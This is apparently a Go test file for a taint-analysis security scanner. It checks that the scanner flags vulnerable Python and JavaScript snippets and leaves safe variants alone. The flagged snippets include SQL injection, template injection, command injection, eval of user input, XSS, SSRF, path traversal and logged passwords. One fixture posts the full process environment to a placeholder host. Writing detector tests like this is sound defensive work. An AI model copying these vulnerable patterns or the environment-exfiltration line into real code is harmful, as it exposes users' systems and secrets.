package main

import "testing"

// The taint pass must catch cross-line flows the single-line patterns miss,
// without misfiring on the safe forms (parameterized queries, static templates,
// sanitized values, unrelated dynamic strings).

// TestTaintSpecExemplars verifies every declarative taint spec (taint/*.json)
// against its own shipped exemplars: the noncompliant one must be caught, the
// compliant one must not. New coverage is a JSON file plus exemplars, checked
// here — no new engine code or hand-written test case.
func TestTaintSpecExemplars(t *testing.T) {
	kb := loadKB()
	if len(generatedTaintSpecs) == 0 {
		t.Fatal("no taint specs generated")
	}
	for i := range generatedTaintSpecs {
		s := &generatedTaintSpecs[i]
		if s.Noncompliant == "" {
			continue
		}
		if !scanHitsCWE(kb, s.CWE, s.Noncompliant) {
			t.Errorf("%s taint spec: noncompliant exemplar not caught:\n%s", s.CWE, s.Noncompliant)
		}
		if s.Compliant != "" && scanHitsCWE(kb, s.CWE, s.Compliant) {
			t.Errorf("%s taint spec: compliant exemplar FALSE-POSITIVES:\n%s", s.CWE, s.Compliant)
		}
	}
}

func taintCWEs(t *testing.T, path, code string) map[string]bool {
	t.Helper()
	kb := loadKB()
	m := map[string]bool{}
	for _, f := range kb.scan(path, code) {
		m[f.Rule.CWE] = true
	}
	return m
}

func TestTaintCrossLineCatches(t *testing.T) {
	cases := []struct {
		name, path, code, cwe string
	}{
		{"ssti-fstring", "app.py",
			"name = request.args.get('name')\ntmpl = f\"Hello {name}!\"\nreturn render_template_string(tmpl)\n", "CWE-1336"},
		{"ssti-concat", "app.py",
			"tmpl = \"Hi \" + name\nreturn render_template_string(tmpl)\n", "CWE-1336"},
		{"ssti-return-adjacent", "app.py",
			"greeting = f\"Hello {request.args['n']}\"\nreturn render_template_string(greeting)\n", "CWE-1336"},
		{"sqli-fstring", "db.py",
			"uid = request.args.get('id')\nq = f\"SELECT * FROM users WHERE id={uid}\"\ncur.execute(q)\n", "CWE-89"},
		{"cmdi-system", "run.py",
			"host = request.args.get('host')\ncmd = \"ping \" + host\nos.system(cmd)\n", "CWE-78"},
		{"code-eval", "calc.py",
			"expr = request.args.get('expr')\nresult = eval(expr)\n", "CWE-94"},
		{"deser-yaml-user", "load.py",
			"data = request.data\ncfg = yaml.load(data)\n", "CWE-502"},
		{"xss-innerhtml", "page.js",
			"const msg = `<b>${userInput}</b>`;\nel.innerHTML = msg;\n", "CWE-79"},
		{"alias-hop", "app.py",
			"raw = f\"Hi {request.args['n']}\"\nt = raw\nrender_template_string(t)\n", "CWE-1336"},
		{"ssrf-user-url", "fetch.py",
			"u = request.args.get('url')\nr = requests.get(u)\n", "CWE-918"},
		{"path-traversal", "dl.py",
			"fn = request.args.get('file')\ndata = open(fn).read()\n", "CWE-22"},
		{"open-redirect", "app.py",
			"dest = request.args.get('next')\nreturn redirect(dest)\n", "CWE-601"},
		{"sens-log-var", "auth.py",
			"pw = request.form['password']\nlogger.debug(pw)\n", "CWE-532"},
		{"sens-log-byname", "auth.py",
			"logging.info(access_token)\n", "CWE-532"},
		{"exfil-env-crossline", "boot.py",
			"env = dict(os.environ)\nrequests.post('https://x/collect', json=env)\n", "CWE-200"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if !taintCWEs(t, c.path, c.code)[c.cwe] {
				t.Errorf("expected %s to be flagged for %s, got miss", c.cwe, c.name)
			}
		})
	}
}

func TestTaintNoFalsePositives(t *testing.T) {
	cases := []struct{ name, path, code string }{
		{"sqli-parameterized", "db.py",
			"q = \"SELECT * FROM users WHERE id = ?\"\ncur.execute(q, (uid,))\n"},
		{"ssti-static-template-context-var", "app.py",
			"GREETING = \"Hello {{ name }}!\"\nname = request.args.get('name')\nreturn render_template_string(GREETING, name=name)\n"},
		{"cmdi-sanitized-shlex", "run.py",
			"host = request.args.get('host')\ncmd = \"ping \" + shlex.quote(host)\ncmd = shlex.quote(cmd)\nos.system(cmd)\n"},
		{"sqli-int-cast", "db.py",
			"uid = int(request.args.get('id'))\nq = f\"SELECT * FROM users WHERE id={uid}\"\ncur.execute(q)\n"},
		{"unrelated-dynstring-static-sink", "app.py",
			"msg = f\"count {n}\"\nlog(msg)\nrender_template_string(STATIC_TEMPLATE)\n"},
		{"deser-safe-api", "load.py",
			"cfg = yaml.safe_load(request.data)\n"},
		{"ssrf-const-url", "fetch.py",
			"r = requests.get(API_URL)\n"},
		{"redirect-url-for", "app.py",
			"return redirect(url_for('home'))\n"},
		{"log-nonsensitive", "app.py",
			"logger.info(f\"user {user_id} logged in\")\n"},
		{"log-redacted", "auth.py",
			"pw = request.form['password']\nlogger.info(mask(pw))\n"},
		{"log-secret-in-string-literal", "app.py",
			"logger.info(\"password reset requested\")\n"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			m := taintCWEs(t, c.path, c.code)
			// The safe SQLi/SSTI/deser snippets must not raise their class.
			bad := map[string]string{
				"sqli-parameterized": "CWE-89", "ssti-static-template-context-var": "CWE-1336",
				"cmdi-sanitized-shlex": "CWE-78", "sqli-int-cast": "CWE-89",
				"unrelated-dynstring-static-sink": "CWE-1336", "deser-safe-api": "CWE-502",
				"ssrf-const-url": "CWE-918", "redirect-url-for": "CWE-601",
				"log-nonsensitive": "CWE-532", "log-redacted": "CWE-532",
				"log-secret-in-string-literal": "CWE-532",
			}
			if cwe := bad[c.name]; cwe != "" && m[cwe] {
				t.Errorf("false positive: %s raised %s on safe code", c.name, cwe)
			}
		})
	}
}
